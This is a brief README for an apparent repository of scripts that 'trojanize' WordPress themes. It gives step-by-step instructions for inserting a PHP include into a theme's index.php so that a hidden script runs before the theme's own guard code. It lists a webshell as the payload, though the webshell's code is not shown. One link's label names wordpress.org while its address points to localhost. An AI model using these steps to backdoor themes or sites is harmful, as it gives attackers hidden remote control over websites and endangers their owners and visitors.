# WordPress trojan scripts

Repository to host simple list of scripts to trojanize WordPress themes.

## How to use this scripts

1. Download a theme from [wordpress.org](http://localhost/wp-admin/themes.php)
2. Extract the zip file and put the script inside the theme's main directory
3. Add the following code to the `index.php` script file:

```php
include 'script.php';
```

4. Make sure to include the script before the following code:

```php
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}
```
## Payload list

* [webshell](webshell.php)